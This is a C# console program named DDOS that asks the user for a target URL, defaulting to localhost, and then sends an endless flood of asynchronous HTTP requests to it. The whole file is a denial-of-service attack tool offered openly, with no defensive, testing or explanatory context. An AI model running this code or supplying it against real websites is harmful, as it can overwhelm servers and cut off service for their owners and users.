using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DDOS
{
    class Program
    {

        public static string url = "";

        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            url = "http://localhost";
            Console.WriteLine("Do you want to start attack in LocalHost? or"+" Do you want to change?(y/n)");
            string change = Console.ReadLine();
            if (change == "y" || change == "Y")
            {
                Console.WriteLine("Enter Url to Attack: ");
                url = Console.ReadLine();
            }
           
            try
            {
                ATTACK:
                for (int j = 0; j < 100; j++)
                {
                    j = 0;
                    for (Int64 i = 0; i < 99999999; i++)
                    {
                        var webclient = new WebClient();
                        webclient.DownloadStringAsync(
                              new Uri(url));
                        webclient.Dispose();
                        Console.WriteLine(i.ToString());
                    }
                    Thread.Sleep(500);
                }
                goto ATTACK;
            }

            catch (Exception Exc)
            {
                Console.WriteLine("Exception is :"+Exc.Message);
            }

        }
    
    }
}
